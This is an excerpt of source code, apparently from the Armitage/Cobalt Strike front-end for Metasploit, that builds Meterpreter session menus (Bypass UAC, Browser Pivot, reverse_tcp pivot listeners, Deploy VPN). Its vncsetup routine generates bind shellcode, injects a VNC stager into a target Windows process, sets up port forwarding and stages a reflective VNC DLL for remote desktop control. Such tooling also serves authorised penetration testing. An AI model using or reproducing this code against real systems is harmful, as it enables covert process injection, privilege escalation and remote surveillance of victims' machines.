...
sub showMeterpreterMenu {
	...
	if ("*win*" iswm $platform) {
		...
		item($j, "Bypass UAC", 'B', lambda({
			bypassuacMeterpreter($sid);
		}, $sid => "$sid"));
	...
	$j = menu($1, "Interact", 'I');
			...
			if ("*win*" iswm $platform) {
				item($j, "Desktop (VNC)", 'D', lambda({ 
					# spawn the program we will inject our VNC server into!
						...
						if ($0 eq "end") {
							if (["$2" trim] ismatch 'Process (\d+) created.*') {
								...
								$display = rand(9) . rand(9);
      								$pid = matched()[0];
								if ($REMOTE) {
									[lambda(&vncsetup): $sid, $MY_ADDRESS, int("59 $+ $display"), $pid];
								}
								else {
									[lambda(&vncsetup): $sid, "127.0.0.1", int("59 $+ $display"), $pid];
								}
							}
							else {
								showError("Could not spawn notepad.exe to inject server into:\n $+ $2");
							}
						}
					}, \$sid, \$REMOTE));
				}, $sid => "$sid"));
	...
	$j = menu($1, "Explore", 'E');
			...
			if ("*win*" iswm $platform) {
				item($j, "Browser Pivot", 'P', lambda({
					setupBrowserPivot($sid);
				}, $sid => "$sid"));
			}
	...
	$j = menu($1, "Pivoting", 'P');
			...
			item($j, "Listener...", 'L', lambda({
				newListener($null, $null, $filter => "*reverse_tcp", $pivot => sessionToHost($sid) . ' via ' . $sid, $callback => lambda({
					showError("Listener created.");
				}));
			}, $sid => "$sid"));

			if ("*win*" iswm $platform) {
				separator($j);
				item($j, "Deploy VPN", 'V', lambda({ chooseVPN($sid); }, $sid => "$sid"));
			}
...
sub vncsetup {
	local('$sid $rport $pid $stager $vhost $vport');
	($sid, $vhost, $vport, $pid) = @_;
	$rport = randomPort();

	#
	# 1) Generate our localhost-only bind shellcode and configure payload options
	#
	local('$handle $file %o $shellcode');
	$shellcode = generateBindShellcode($rport);

	$file = getFileProper("stager" . rand(1000) . ".bin");
	$handle = openf("> $+ $file"); 
	...
	yield;
	%o["PAYLOADFILE"] = convertAll($1);

	#
	# 1) inject VNC stager into memory of target...
	#
	%o["PID"]         = $pid;
	%o["SESSION"]     = $sid;
	%o["NEWPROCESS"]  = "false";

	call_async_callback($mclient, "module.execute", $this, "exploit", "windows/local/payload_inject", %o);
	yield;

	#
	# 2) create portfwd
	#
	m_cmd($sid, "portfwd add -l $rport -p $rport -r 127.0.0.1");

	#
	# 3) read in VNC server x86 stage
	# 
	if ($client is $mclient) {
		local('$handle $stage $dll');
		$handle = openf(getFileProper($DATA_DIRECTORY, "vncdll.x86.dll"));
		$dll    = readb($handle, -1);	
		closef($handle);
	}
	else {
		call_async_callback($mclient, "armitage.download_resource", $this, "vncdll.x86.dll");
		yield;
		$dll = convertAll($1)['data'];
	}

	$stage = [common.ReflectiveDLL patchDOSHeader: $dll];

	#
	# 4) task the viewer to connect to our portfwd and stage the payload.
	#
	local('$viewer');
	$viewer = [new com.glavsoft.viewer.Viewer: $vhost, $rport, $stage, 1, lambda({
		[$frame addTab: "Desktop $sid", $1, lambda({
			# kill our VNC client
			fork({ [$viewer closeApp]; }, \$viewer);

			# kill our portfwd
			m_cmd($sid, "portfwd delete -l $rport -p $rport -r 127.0.0.1");

			# ideally, kill the process with our VNC server in it too!
			m_cmd($sid, "kill $pid");
		}, $viewer => $1, \$rport, \$sid, \$pid)];
	}, \$sid, \$rport, \$pid)];
}
